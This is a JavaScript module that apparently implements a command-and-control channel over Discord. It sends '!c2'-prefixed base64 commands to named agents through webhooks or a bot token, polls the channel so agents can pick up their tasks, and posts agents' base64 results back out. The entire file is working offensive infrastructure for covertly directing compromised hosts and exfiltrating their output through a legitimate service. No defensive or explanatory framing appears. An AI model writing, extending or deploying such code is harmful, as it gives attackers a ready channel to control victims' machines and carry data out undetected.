const https = require('https');

class Discord {
  constructor(config) {
    this.webhookId = config.webhookId;
    this.webhookToken = config.webhookToken;
    this.botToken = config.botToken;
    this.channelId = config.channelId;
    this.commandPrefix = '!c2';
    this.apiBase = 'discord.com';
  }

  _request(opts, body) {
    return new Promise((resolve, reject) => {
      const req = https.request(opts, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const parsed = JSON.parse(data);
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(parsed);
            } else {
              reject(new Error(`Discord API error ${res.statusCode}: ${JSON.stringify(parsed)}`));
            }
          } catch (e) {
            reject(new Error(`Discord API error ${res.statusCode}: ${data}`));
          }
        });
      });
      req.on('error', reject);
      if (body) req.write(typeof body === 'string' ? body : JSON.stringify(body));
      req.end();
    });
  }

  async sendCommand(agentId, b64Payload) {
    const content = `${this.commandPrefix} ${agentId}: ${b64Payload}`;

    if (this.webhookId && this.webhookToken) {
      const result = await this._request({
        hostname: this.apiBase,
        path: `/api/webhooks/${this.webhookId}/${this.webhookToken}`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, { content });
      return { id: result.id };
    }

    if (this.botToken && this.channelId) {
      const result = await this._request({
        hostname: this.apiBase,
        path: `/api/channels/${this.channelId}/messages`,
        method: 'POST',
        headers: {
          'Authorization': `Bot ${this.botToken}`,
          'Content-Type': 'application/json'
        }
      }, { content });
      return { id: result.id };
    }

    throw new Error('Discord: no webhook or bot token configured');
  }

  async pollCommands(agentId) {
    if (!this.botToken || !this.channelId) {
      throw new Error('Discord: botToken and channelId required for polling');
    }

    const messages = await this._request({
      hostname: this.apiBase,
      path: `/api/channels/${this.channelId}/messages?limit=50`,
      method: 'GET',
      headers: {
        'Authorization': `Bot ${this.botToken}`
      }
    });

    if (!Array.isArray(messages)) {
      throw new Error('Discord: unexpected response format');
    }

    const commands = [];
    const prefix = `${this.commandPrefix} ${agentId}:`;

    for (const msg of messages) {
      if (msg.content && msg.content.startsWith(prefix)) {
        const b64Payload = msg.content.substring(prefix.length).trim();

        commands.push({
          id: msg.id,
          agentId,
          command: b64Payload,
          timestamp: msg.timestamp
        });
      }
    }
    return commands;
  }

  async sendResult(agentId, b64Payload) {
    const content = `${this.commandPrefix} result ${agentId}: ${b64Payload}`;

    if (this.webhookId && this.webhookToken) {
      const result = await this._request({
        hostname: this.apiBase,
        path: `/api/webhooks/${this.webhookId}/${this.webhookToken}`,
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      }, { content });
      return { id: result.id };
    }

    if (this.botToken && this.channelId) {
      const result = await this._request({
        hostname: this.apiBase,
        path: `/api/channels/${this.channelId}/messages`,
        method: 'POST',
        headers: {
          'Authorization': `Bot ${this.botToken}`,
          'Content-Type': 'application/json'
        }
      }, { content });
      return { id: result.id };
    }

    throw new Error('Discord: no webhook or bot token configured');
  }

  async test() {
    try {
      if (this.webhookId && this.webhookToken) {
        await this._request({
          hostname: this.apiBase,
          path: `/api/webhooks/${this.webhookId}/${this.webhookToken}`,
          method: 'POST',
          headers: { 'Content-Type': 'application/json' }
        }, { content: 'tsc-lotl test' });
        return true;
      }
      if (this.botToken) {
        const result = await this._request({
          hostname: this.apiBase,
          path: '/api/users/@me',
          method: 'GET',
          headers: { 'Authorization': `Bot ${this.botToken}` }
        });
        return !!result.id;
      }
      return false;
    } catch {
      return false;
    }
  }
}

module.exports = Discord;
